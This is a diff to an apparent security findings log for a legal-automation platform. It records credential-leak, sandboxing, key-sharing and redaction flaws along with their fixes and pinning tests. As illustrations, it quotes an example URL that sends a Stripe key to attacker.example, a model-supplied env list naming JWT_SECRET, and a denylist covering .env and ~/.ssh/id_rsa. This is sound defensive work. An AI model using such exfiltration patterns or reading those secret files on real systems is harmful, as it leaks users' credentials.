+  each: the process log, the RETRY PROMPT sent back to the model, and the persisted record / SSE
+  stream rendered to the user. (H-6) `automation/planner.ts` built a 50-character preview of an
+  auth-shaped header's VALUE and interpolated it into a cross-validation violation — and the thing
+  being reported is by definition a literal credential the model just wrote, so the check designed
+  to stop raw tokens in headers was itself copying them into all three sinks. The sibling argv check
+  echoed the whole offending argv element. Both now report a CATEGORY: the header NAME, or the argv
+  POSITION. (H-1 assertion leg) `automation/executor.ts` `expect_text` echoed 200 raw characters of
+  `innerText` from a page of an AUTHENTICATED session, `expect_url` echoed the full URL including
+  the query string where magic-link tokens and SSO codes live, and `expect_title` echoed the title
+  whole. These are the ONE live in-process DOM-text path the gate identified as reaching the
+  rehearsal fixer's prompt. Now: the expectation plus a character COUNT, origin + pathname, and a
+  bounded title. Pinned in `api/tests/security/credential-boundaries.test.ts`.
+  NOT YET DONE, and explicitly still open: the rest of H-1 — `local_command` stdout/stderr,
+  `ekoa_action` results and `extractActionRunOutput` still need the run-scoped `SecretRegistry`
+  threaded through the engine, which is a structural change rather than a message fix.
+- **`anonymisation-skips-the-pixel-plane`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre
+  discovery gate H-2). `api/src/llm/client.ts` anonymises `prompt` and `systemPrompt` at the egress
+  chokepoint (`:967-968`) and forwards `images: opts.images` VERBATIM (`:981`) — and
+  `api/tests/llm/client.test.ts` PINNED that forwarding as the contract, so the gap read as
+  intended behaviour. `docs/security.md` described the pipeline as covering "all model-bound text",
+  which is true and false-by-omission at once: a reader took it as covering everything model-bound.
+  For this product the pixels are screenshots of an AUTHENTICATED session on a court portal —
+  processo numbers, client NIFs, and during a login step the credential itself. FIXED BROWSER-SIDE,
+  because a Cortex-side transform on a finished PNG is OCR-and-hope: `automation/screenshot-masking.ts`
+  masks credential-bearing regions by LOCATOR at capture time (so the sensitive pixels are never
+  rendered into the buffer) with a SOLID mask colour, and `LocalBrowserSession` gains
+  `withCaptureSuppressed()` so a credential window takes NO picture at all — a stronger guarantee
+  than masking the field. The failure mode is the decisive property: a masking failure returns null,
+  which the existing capture path already treats as "no screenshot this step", so it can never
+  degrade to an unmasked capture. The pinning test is re-framed in place as plumbing-only and
+  `docs/security.md` now states the text/pixel split, including the RESIDUAL: a screenshot still
+  carries non-credential page content as untokenized pixels. Pinned by
+  `api/tests/security/screenshot-masking.test.ts` (12 cases).
+- **`envwhitelist-reads-cortex-env`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery
+  gate D4/J-4). `LocalCommandSpec.envWhitelist` was a list of environment variable NAMES accepted
+  from the planner (a model) which `buildEnv` resolved against the CORTEX API SERVER's OWN
+  `process.env` — provider keys, `ENCRYPTION_KEY`, `JWT_SECRET`, database credentials — and shipped
+  the resolved values to a user's machine. A model-authored `envWhitelist: ["JWT_SECRET"]` was a
+  complete platform compromise expressed as an ordinary step field. It never had a receiver
+  (`ekoa-bridge`'s bash tool hard-scrubs the child to seven names) and `local_command` is unreachable
+  end-to-end, so it was latent rather than live — but it would have gone live the moment
+  `setDaemonConnectionResolver` was wired. DELETED rather than hardened, in the same change that
+  adds the real primitive (`api/src/cofre/process-injection.ts`), because deletion cost nothing then
+  and becomes impossible later. Pinned by `api/tests/security/i9-env-injection.test.ts` (29 cases),
+  which includes a STATIC GUARD asserting the declaration and both use sites are gone.
+- **`cofre-absent`** (IN PROGRESS 2026-07-27, the Cofre build itself — Cofre WS-A/WS-B/WS-C). The
+  discovery gate found NO Cofre: no credential item model, no grants, no policy-lock seam, no origin
+  binding as a property of a credential, no relay typing, no session store. LANDED SO FAR: the
+  `shared/src/cofre.ts` vocabulary with I7 and I8 encoded as SCHEMA (a `certificate_identity` cannot
+  hold a TTL grant; a signature relay cannot be constructed without a document name + hash), and
+  `api/src/cofre/` with the single `unwrap()` seam — fail-closed on tenancy, an active grant, origin
+  binding and existence, all checked before anything decrypts. Owner-scoped, ciphertext-only at rest,
+  lock-now / lock-all, and an item view with no value field. Pinned by
+  `api/tests/security/cofre-policy-lock.test.ts` (28) and `shared/src/cofre.test.ts` (28).
+  STILL OPEN, in plan order: the routes and the product surfaces (WS-D, which must EXTEND the shipped
+  `/settings/privacy` grants+ledger area rather than create a parallel one), the typist (WS-F, blocked
+  on the `api/src/streaming/` security pass F-1), session-first storage (WS-G), the redaction pipeline's
+  remaining legs (WS-H, incl. the image-plane bypass at `llm/client.ts:981` that a TEST currently pins),
+  egress selection (WS-I), bridge protocol v2 + the I9 primitive (WS-J), and the KMS envelope (WS-K).
+  A D8 audit of the live OAuth credential-custody plane is owed BEFORE the item model is considered
+  fixed — `platform-oauth.ts`, `m365-proxy.ts`, `prefetch.ts`, `app-sso-sessions.ts` and
+  `pipedream.ts` hold refresh tokens today and no audit issued a verdict on any of them.
+- **`bridge-jwt-key-monoculture`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate
+  R-8). `api/src/bridge/signing.ts` keyed the DelegatedTask HMAC with `loadConfig().jwtSecret` — the
+  platform-wide secret that signs every user's session token — while `ekoa-bridge` stores
+  `signingSecret` in a plaintext `config.json` (0600) on every paired laptop. Making delegation WORK
+  therefore required placing the key behind every session in the deployment on every user's machine,
+  so one compromised laptop compromised every session. Worse, NOTHING on the daemon side ever WROTE
+  `signingSecret` (`pair.ts:72` only carried an existing value forward; `serve.ts:84` fell back to
+  `''`), so in practice the delegated path was unusable without an operator hand-copying
+  `JWT_SECRET` — the daemon's verifier refuses an empty key, so it denied every task: fail-closed,
+  but for an invisible reason. FIXED by minting a PER-PAIRING secret in `registerPairing`, encrypted
+  at rest, preserved across a redial (rotating would silently break a daemon holding the old one)
+  and delivered to the owner on the already-authenticated `/bridge/token` exchange. `signDelegatedTask`
+  / `verifyDelegatedTaskSig` take the secret as a parameter and refuse an empty one loudly — which
+  also CONVERGES this signer with `ekoa-bridge/src/wire/signing.ts`, whose vendored copy parameterised
+  the secret and added that guard back in 2026-07-10. A pairing with no secret is REFUSED (`denied`),
+  never a fallback. Pinned by `api/tests/security/bridge-key-split.test.ts` (11 cases).
+- **`bridge-revoke-unreachable`** (FIXED 2026-07-27, MEDIUM, availability of the kill switch — Cofre
+  discovery gate R-9). `revokePairing` (`api/src/bridge/registry.ts:203`) implements terminal
+  revocation with a tombstone that survives a redial and closes the live socket — and had NO
+  production caller. It was reachable only from `api/tests/*`; the daemon's own `unpair` is
+  local-only. A compromised machine could not be cut off except by deactivating the whole account.
+  FIXED by mounting `DELETE /api/v1/bridge/pairings/:pairingId` (owner or org-admin — a compromised
+  machine is exactly when the org's admin may need to act without the owner), answering 404 rather
+  than 403 outside the caller's scope so the route is not an existence oracle, and emitting a
+  metadata-only `security::bridge_pairing_revoked` Registo row.
+- **`bridge-delegation-org-adopted`** (FIXED 2026-07-27, MEDIUM, tenant isolation — Cofre discovery
+  gate E-1). `delegateToLocal` called `getConn(actor.userId)` with NO `expectedOrg`, and
+  `DelegationActor` had no `orgId` field, so the task's org was ADOPTED from whatever connection
+  resolved rather than checked. Org binding was structural on the connect and provider paths and
+  adopted-not-checked on the one dispatch path that mints a SIGNED task. FIXED by carrying `orgId`
+  on `DelegationActor` (bound from the run's actor, never a request body) and passing it as
+  `expectedOrg`, so a pairing in another org reads as no pairing.
+- **`bridge-excerpts-no-denylist`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
+  Cofre discovery gate H-7). `ekoa-bridge/src/containment/resolver.ts` enforced only that the
+  realpath stays inside a granted root. Containment answers "may the daemon touch this location";
+  it cannot answer "should these BYTES cross Boundary 1", and they do — `engine.ts` `compose()`
+  concatenates file excerpts verbatim into the provider_request body (its own comment: "The
+  excerpts cross Boundary 1 here"). A user who granted a project directory containing `.env` or
+  `.ssh/` had not consented to shipping their keys to a model. FIXED with a credential-bearing
+  denylist applied to the REAL path, kept byte-identical to
+  `api/src/security/path-containment.ts`; the two copies should be shared through the release
+  artifact rather than by hand. Defence in depth only — containment remains the control.
+- **`bridge-ledger-records-secrets`** (FIXED 2026-07-27 in `ekoa-bridge`, MEDIUM, confidentiality —
+  Cofre discovery gate H-5). `AutomationLedgerRow.detail` was "the full bash command line, or the
+  browser navigation target — recorded in full" per ADR-002, on an append-only, fsynced ledger that
+  is forwarded to Cortex as trust-chip metadata. A secret passed as an argv literal
+  (`curl -H "Authorization: Bearer …"`) or a one-time code in a URL was written to disk in
+  cleartext, permanently, on the user's own machine — by the same component that must hold
+  delivered secrets RAM-only. The audit requirement is "which invocation happened, and can I
+  correlate two of them", not "what were the argument values", so rows now carry a SHAPE (program
+  name + argument count, or origin+pathname) plus `detailHash`, a stable non-reversible correlation
+  id. `detailHash` is optional in the schema so pre-H-5 ledger lines still parse instead of reading
+  as corrupt. Two existing tier2 assertions pinned the verbatim detail and were updated.
+- **`credential-origin-unbound`** (FIXED 2026-07-27, CRITICAL, confidentiality — Cofre discovery
+  gate R-2). Credential use had NO origin binding on either HTTP path, and the path where the MODEL
+  authored the destination had the WEAKER egress control. `automation/executors/api-call.ts`
+  interpolated the decrypted fields of a model-supplied `authIntegrationKey` into a model-supplied
+  URL behind only `guardedFetch`'s SSRF check — which by design permits every PUBLIC host — so
+  `url: "https://attacker.example/?k={{integration.stripe.api_key}}"` exfiltrated a live tenant
+  secret in one hop, and `rehearsal.ts` let the mid-run fixer author both fields.
+  `integrations/action-executor.ts` was worse: a bare `globalThis.fetch` behind a `^https?://`
+  shape check on a baseUrl written verbatim from an LLM-authored package config, with no SSRF guard
+  at all. FIXED by `api/src/security/origin-binding.ts`: `credentialedFetch` /
+  `assertOriginAllowed` make `allowedOrigins` a REQUIRED option and refuse an empty list, so
+  "we could not determine the binding" and "any host is fine" can never share a code path. Matching
+  is exact-host or parent-domain, never a suffix string (`evil-stripe.com` does not satisfy a
+  binding to `stripe.com`). The api_call executor checks AFTER interpolation and BEFORE the
+  request, so a refused destination never sees the credential; the refusal does not echo the
+  attacker-chosen URL into the persisted record. The interim binding is derived from the
+  integration's own declared base URLs via a fail-closed seam
+  (`setIntegrationOriginResolver`); Cofre per-item `boundOrigins` replaces the derivation in WS-C
+  without moving the enforcement point. `action-executor.ts` now also goes through `guardedFetch`.
+  Pinned by `api/tests/security/origin-binding.test.ts` (20 cases) and
+  `api/tests/security/api-call-origin-binding.test.ts` (8 cases through the real executor).
+- **`integration-package-baseurl-unreviewed`** (OPEN, HIGH, confidentiality — raised while fixing
+  R-2). A user-defined integration package's `httpConfig.baseUrl` is written VERBATIM from an
+  LLM-authored `config.json` (`routes/integration-builder.ts:210` →
+  `integrations/definitions.ts` `writeRuntimePackage`), and the owner's decrypted credential is
+  injected into requests against it. R-2 put that path behind the SSRF guard, which stops it
+  reaching internal infrastructure, but origin binding CANNOT fix it: the allowlist for a package
+  is derived from the package's own declared host, so binding it to itself is tautological. A
+  package that declares `baseUrl: https://attacker.example` is therefore still able to receive the
+  credential it is configured with. This is a PROVENANCE problem — the fix is an approval gate on
+  the declared host when a package is created or edited (and, later, the Cofre grant ceremony
+  naming the host the user is consenting to). Deliberately not closed inside R-2 because it needs a
+  user-facing approval surface, not a filter.
+- **`ekoa-action-unsandboxed-fs`** (FIXED 2026-07-27, CRITICAL, confidentiality + integrity — Cofre
+  discovery gate R-1). `resolveUserPath` in `api/src/automation/platform-primitives.ts` applied no
+  containment whatsoever — `if (isAbsolute(path)) return path;`, with the comment "trust user-issued
+  paths via Ekoa actions, since manifests are authored by the coding agent under our control". That
+  premise is false in both directions: the recipe is MODEL-authored (I5) and `rehearsal.ts` lets the
+  mid-run fixer LLM choose which capability runs. `file.read` of any absolute path put the bytes in
+  `ctx.captured`, which is persisted as `capturedValues` and returned by `extractActionRunOutput`
+  into the calling agent's tool result (I1/I2/I4); `file.write` was equally unrestricted. Because
+  `ekoa_action` executes CLOUD-side with no daemon dependency, this ran on the API host today.
+  FIXED by `api/src/security/path-containment.ts` — a copy-with-review of the daemon's ADR-001
+  resolver (real-path checked, symlink-escape proof, write-safe for not-yet-created leaves) — rooted
+  at a per-owner `<dataDir>/action-workspace/<orgId>/<userId>`, plus a credential-bearing denylist
+  applied to the REAL path so a benign label cannot launder `~/.ssh/id_rsa`. `~` now means the
+  workspace root, not the host home directory. An absolute host path is REFUSED rather than
+  silently reinterpreted as root-relative (that reinterpretation was a first-cut defect of this fix,
+  caught by its own test: it turned a containment breach into a confusing ENOENT).
+  Pinned by `api/tests/security/action-path-containment.test.ts` (32 cases) and
+  `api/tests/security/action-file-primitives.test.ts` (11 cases, through `executeRecipe`).
+- **`redaction-masker-leak`** (FIXED 2026-07-27, HIGH, confidentiality — Cofre discovery gate R-6).
+  Two divergent private copies of the value-keyed masker existed, each leaking in a different way,
+  and BOTH silently skipped any secret shorter than four characters — the failure mode a masker must
+  never have, because a value that is quietly not masked reads exactly like one that was.
+  `integrations/http-template.ts`'s `maskValue` emitted `***…1234`, a persisted plaintext SUFFIX of
+  every credential the platform ever proxied; `automation/executors/api-call.ts` masked to
+  `<redacted>` with no leak but matched only the RAW literal, so a URL-encoded, base64 or
+  JSON-escaped occurrence walked straight into the persisted step record. FIXED by
+  `api/src/security/redaction.ts`: a run-scoped `SecretRegistry` substituting `[REDACTED:<handle>]`
+  (no plaintext fragment, no length hint) across raw / URL-encoded / base64 / base64url /
+  JSON-escaped forms, longest-value-first, case-folded above 8 chars. Both copies are now thin
+  callers. Sub-3-char values are still not substituted — doing so would destroy the surrounding
+  stream — but they are surfaced on `registry.unmaskable` instead of being dropped in silence.
+  Pinned by `api/tests/security/redaction.test.ts` (24 cases, one per regression).
+- **`citius-listener-blocked`** (OPEN, MEDIUM, correctness — 2A-S4 review). `citius` is the one
+  SHIPPED user-defined listener source that is not deferred for a missing transport, and it still
+  cannot poll. 2A-S4 fixed the part that belonged to the listener rail (the composition root now
+  injects the automation seam into the executor the supervisor uses, guarded by a static test, and
+  the poll unwraps the automation run envelope so the package's `listenerConfig` paths resolve
+  against the action's own output). TWO blockers remain, neither of them the rail's and neither
+  silent — the listener fails loudly on every tick with the exact reason on its failure counter:
+  (1) `automationBinding.automationId` is the template placeholder `citius-<template>-template`,
+  which no lookup resolves; ekoa-dev rewrote that id to the per-owner provisioned id inside the
+  USER SANDBOX COPY of the package (integration-storage.ts), and ekoa-code deliberately descoped
+  per-user sandbox packages, so the shipped binding never matches the org's provisioned automation
+  (`managedAutomationId(key, templateKey)` = `citius-<template>`). The failure surfaces as
+  `unknown_automation: citius-notificacoes-template`. This equally breaks the automation
+  `integration` step, i.e. it is NOT specific to the listener rail; two committed assertions
+  currently pin the placeholder value (`api/tests/contract/integration-definitions.test.ts`,
+  `api/tests/e2e/citius-integration.e2e.mjs`), so the fix (resolve the bound id via the
+  deterministic managed id, or re-point the shipped package and both assertions) is a deliberate
+  separate change. (2) The CITIUS captured browser session does not exist yet — `session-capture.ts`
+  is track 2A slice 6 — so even a resolvable automation cannot authenticate to the Portal dos
+  Mandatários. Close with 2A-S6 plus the id fix.
+- **`event-array-field-shape-drift`** (OPEN, LOW, correctness — 2A-S4 review note). Both poll
+  sources treat a non-array `eventArrayField` as an empty batch (`asArray` returns `[]`), so a
+  provider that changes the shape of that field advances the cursor over items that were never
+  read. Identical in `platform-poll.ts` (approved at 2A-S1) and in ekoa-dev, so it is recorded here
+  rather than changed inside a slice: the honest fix is to distinguish "absent/array" (a real empty
+  batch) from "present but not an array" (a shape change ⇒ stall the cursor and report it).
+
 - **`insolvencia-watch-at-least-once`** (OPEN, LOW, quality — run 20260717-190134 E4). The Citius
   insolvência polling watcher persists a seen-ref after each durable watch.hit emit, but the
   emit-then-persist is at-least-once not atomic: if `updateWatch` itself fails after the event
